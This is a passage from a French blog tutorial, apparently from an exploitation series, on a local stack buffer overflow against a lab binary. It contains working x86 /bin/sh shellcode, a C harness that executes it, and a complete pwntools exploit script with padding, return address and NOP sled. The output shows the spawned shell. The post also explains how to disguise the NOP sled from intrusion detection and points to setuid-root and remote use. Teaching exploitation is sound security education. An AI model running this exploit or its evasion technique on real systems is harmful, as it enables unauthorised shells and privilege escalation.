style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x4</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xe1</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0xb</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xcd</span>, <span style="color:#ae81ff">0x80</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() { 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mprotect</span>(
+</span></span><span style="display:flex;"><span>        (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">int</span>)shellcode <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">4095</span>),
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">4096</span>,
+</span></span><span style="display:flex;"><span>        PROT_READ <span style="color:#f92672">|</span> PROT_WRITE <span style="color:#f92672">|</span> PROT_EXEC
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>func)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())shellcode;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">func</span>();
+</span></span><span style="display:flex;"><span>}   
+</span></span></code></pre></div><p>Je trouve que ce code illustre parfaitement le fonctionement et la puissance des pointeurs sur fonction &hellip; a mettre au programme de tout cours de langage C ❤️</p>
+<blockquote>
+<p>Ok, nous avons le <strong>Shellcode</strong>, <strong>l&rsquo;adresse mémoire visée</strong>, il ne nous reste plus qu&rsquo;à calculer notre <strong>padding</strong>, et nous aurons tous les éléments nécessaires pour la création de notre <em>exploit</em>:</p>
+</blockquote>
+<center>
+<figure><img src="/images/shaker.png" width="150"/>
+</figure>
+
+</center>
+<p>Nous allons donc construire une chaine d&rsquo;octets qui sera notre PAYLOAD et dont aucun octet ne devra valoir 0*. Ce PAYLOAD va se composer des parties suivantes :</p>
+<ol>
+<li>Notre PADDING pour nous amener sur les theatres des opérations (trouvé avec GDB + PWNTOOLS/CYCLIC)</li>
+<li>La valeur de l&rsquo;adresse de retour ciblée (trouvé avec GDB)</li>
+<li>Un tapis roulant de 32 NOP pour nous amener avec prudence auprès du SHELLCODE</li>
+<li>Le SHELLCODE qui va ici nous donner un beau /bin/sh</li>
+</ol>
+<p>Et c&rsquo;est cette chaine de BYTES que nous allons envoyer au programme vulnérable lorsqu&rsquo;il nous demandera de saisir le nom de l&rsquo; ONG &hellip;
+&ndash; &quot; Fallait pas l&rsquo;inviter lui ;-) &quot; &mdash;</p>
+<p><em>Bring all together</em> dans un programme Python qui là encore va utiliser <strong>pwntools</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># EXPLOIT.PY</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ----------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Avec pwntools en Python V3.x</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Prendre sous GDB pour bien comprendre le trick </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># GDB -q ./BUF</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># GDB : r &lt; padding.bin</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># GDB : x/12xw $esp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>TAILLE_TAPIS <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>       <span style="color:#75715e"># On part avec un tapis roulant de 32 NOP (par sécurité)</span>
+</span></span><span style="display:flex;"><span>PATTERN <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qaac&#39;</span>        <span style="color:#75715e"># Valeur EIP au moment du SEG FAULT </span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># , résultant de notre flooding avec notre chaine CYCLIC ...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ADDRESS <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffd09c</span> <span style="color:#f92672">+</span> TAILLE_TAPIS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ADDRESS = 0xffffd0bc    # GDB: x/12xw $esp || 0xffffd09c + 32 </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./BUF&#39;</span>)
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Création de l&#39;exploit:&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;jhh</span><span style="color:#ae81ff">\x2f\x2f\x2f</span><span style="color:#e6db74">sh</span><span style="color:#ae81ff">\x2f</span><span style="color:#e6db74">bin</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">h</span><span style="color:#ae81ff">\x01\x01\x01\x01\x81</span><span style="color:#e6db74">4</span><span style="color:#ae81ff">\x24</span><span style="color:#e6db74">ri</span><span style="color:#ae81ff">\x01\x01</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xc9</span><span style="color:#e6db74">Qj</span><span style="color:#ae81ff">\x04</span><span style="color:#e6db74">Y</span><span style="color:#ae81ff">\x01\xe1</span><span style="color:#e6db74">Q</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xd2</span><span style="color:#e6db74">j</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> cyclic_find(PATTERN) <span style="color:#75715e"># Renvoi la position dans la pattern prèalablement générée par Pwntools.Cyclic()</span>
+</span></span><span style="display:flex;"><span>                              <span style="color:#75715e"># c-a-d le contenu de EIP au moment du crash </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset       <span style="color:#75715e"># Amorce avec un tasseau de A (ici on en a besoin de 268)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;padding.bin&#34;</span>,<span style="color:#e6db74">&#34;wb&#34;</span>)   <span style="color:#75715e"># Un fichier, juste pour pouvoir declencher le SEG FAULT plus facilement dans GDB plus tard</span>
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>write(padding)
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eip_cible <span style="color:#f92672">=</span> p32(ADDRESS <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) 
+</span></span><span style="display:flex;"><span>tapis_nop <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> TAILLE_TAPIS <span style="color:#75715e"># on rempli notre tapis roulant de NOP pour glisser </span>
+</span></span><span style="display:flex;"><span>                                   <span style="color:#75715e"># gentillement vers 0xffffd09c (EIP)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;jhh</span><span style="color:#ae81ff">\x2f\x2f\x2f</span><span style="color:#e6db74">sh</span><span style="color:#ae81ff">\x2f</span><span style="color:#e6db74">bin</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">h</span><span style="color:#ae81ff">\x01\x01\x01\x01\x81</span><span style="color:#e6db74">4</span><span style="color:#ae81ff">\x24</span><span style="color:#e6db74">ri</span><span style="color:#ae81ff">\x01\x01</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xc9</span><span style="color:#e6db74">Qj</span><span style="color:#ae81ff">\x04</span><span style="color:#e6db74">Y</span><span style="color:#ae81ff">\x01\xe1</span><span style="color:#e6db74">Q</span><span style="color:#ae81ff">\x89\xe1</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xd2</span><span style="color:#e6db74">j</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\xcd\x80</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> eip_cible <span style="color:#f92672">+</span> tapis_nop <span style="color:#f92672">+</span> shellcode <span style="color:#75715e"># on construit notre charge utile</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Payload = &#34;</span>, payload) <span style="color:#75715e"># j&#39;adore voir cette suite d&#39;octets s&#39;afficher ;-)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;payload.bin&#34;</span>,<span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#75715e"># juste pour sauvegarder mon payload dans un fichier pour pouvoir le rejouer en DEBUG plus tard dans IDA</span>
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>write(payload)
+</span></span><span style="display:flex;"><span>f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><blockquote>
+<p><strong>et un shell tout chaud, un &hellip;</strong></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 ./exploit.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting program <span style="color:#e6db74">&#39;./BUF&#39;</span>: Done
+</span></span><span style="display:flex;"><span>Création de l<span style="color:#e6db74">&#39;exploit:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] Switching to interactive mode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$ id
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Vous avez fait un don de -1869574000 euros a l&#39;</span>ONG Payload <span style="color:#f92672">=</span>  b<span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbd\xd0\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>naptax<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>naptax<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>naptax<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,122<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,134<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,135<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="dissimuler-son-tapis-de-nop">Dissimuler son tapis de NOP</h3>
+<p>Notons que les différents IDS trouveront suspicieux cette suite de NOP. En effet, il est rare qu&rsquo;une telle suite soit nécéssaire pour une exécution souhaitée. C&rsquo;est pourquoi, il faut mieux opter pour d&rsquo;autres instructions d&rsquo;un octet plus neutres pour faire avancer le flux d&rsquo;éxécution vers notre Shellcode. En voici une fiable et simple:</p>
+<p>Mettre des registres à zéro, puis enchainer les instructions <strong>inc</strong> et <strong>dec</strong> de telle manière à ce que le flux avance et les valeurs des registres restent à 0 à la fin du train. Exemple avec eax</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> eax, eax
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inc</span> eax     <span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">0x40</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dec</span> eax     <span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">0x48</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inc</span> eax     <span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">0x40</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dec</span> eax     <span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">0x48</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">inc</span> eax     <span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">0x40</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">dec</span> eax     <span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#ae81ff">0x48</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">...</span>)
+</span></span></code></pre></div><p>Remplacez vos 0x90 0x90 par une série de 0x40 0x48. Cela signe un peu moins comme une signature de Sled.</p>
+<h2 id="pour-finir">Pour finir</h2>
+<p>On est en droit de se demander à quoi peut servir de lancer en local un programme qui lance un shell. Voici 3 scénarios possibles :</p>
+<ol>
+<li>
+<p>Le programme vulnérable appartient à un utilisateur et/ou groupe disposant de plus de privilèges sur le système local que votre user (ex:<em>admin, apache,</em> &hellip;)</p>
+</li>
+<li>
+<p>En plus d&rsquo;etre vulnérable, le vilain programme appartient à <strong>root</strong> et a positioné le bit setuid à 1. Dans ce cas, le shell que vous allez &lsquo;spawner&rsquo; sera un shell root</p>
+</li>
+<li>
+<p>Le programme vulnérable n&rsquo;est pas forcément local &hellip; mais en <strong>REMOTE</strong>. Et son exploitation par débordement de pile vous permet alors de disposer d&rsquo;un shell sur ce système distant ❤️ Le must étant de disposer d&rsquo;un remote shell avec privilèges <em>root</em>.</p>
+</li>
+</ol>
+<p>D&rsquo;ailleurs nous conclurons prochainement cette série PROLOG de mise en jambe (avant les choses sérieuses) par un dernier billet qui expliquera la version Remote Stack Buffer Overflow (ma préférée ;-)</p>
+<p><em>Stay tuned</em> &hellip;</p>
+
+          
+          
+            <div class="related-posts mt-4 py-3">
+              <h5>Related Posts</h5>
+              
+                <div class="row">
+                  <div class="col-4">
+                    <h6 style="text-align: right">
+                      November 15, 2022
+                    </h6>
+                  </div>
+                  <div class="col-8">
+                    <h6 style="text-align: left">
+                      <b><a href="/posts/fr/2022-10-6-prolog003/">[PROLOG] 0x003, Un premier Buffer Overflow (Part 1) | (French version)</a></b>
+                    </h6>
+                  </div>
+                </div>
+              
+                <div class="row">
+                  <div class="col-4">
+                    <h6 style="text-align: right">
+                      November 11, 2022
+                    </h6>
+                  </div>
+                  <div class="col-8">
+                    <h6 style="text-align: left">
+                      <b><a href="/posts/fr/2022-11-11-prolog002/">[PROLOG] 0x002, Les conventions d&rsquo;appels | (French version)</a></b>
+                    </h6>
+                  </div>
+                </div>
+              
+                <div class="row">
+                  <div class="col-4">
+                    <h6 style="text-align: right">
+                      November 1, 2022
+                    </h6>
+                  </div>
+                  <div class="col-8">
+                    <h6 style="text-align: left">
+                      <b><a href="/posts/fr/2022-11-01-prolog001/">[PROLOG] 0x001, La mémoire | (French version)</a></b>
+                    </h6>
+                  </div>
+                </div>
+              
+            </div>
+          
+        </div>
+      </div>
+      <div class="disqus">
+        
+      </div>
+    </div>
+  </div>
+
+    </div>
+    
+    <footer class="footer">
+  <div class="container">
+    <div class="text-muted">Powered by <a href="https://gohugo.io/">Hugo with ♥</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/js/bootstrap.min.js" integrity="sha384-nsg8ua9HAw1y0W1btsyWgBklPnCUAFLuTMS2G72MMONqmOymq585AcH49TLBQObG" crossorigin="anonymous"></script>
+
+  </body>
+</html>
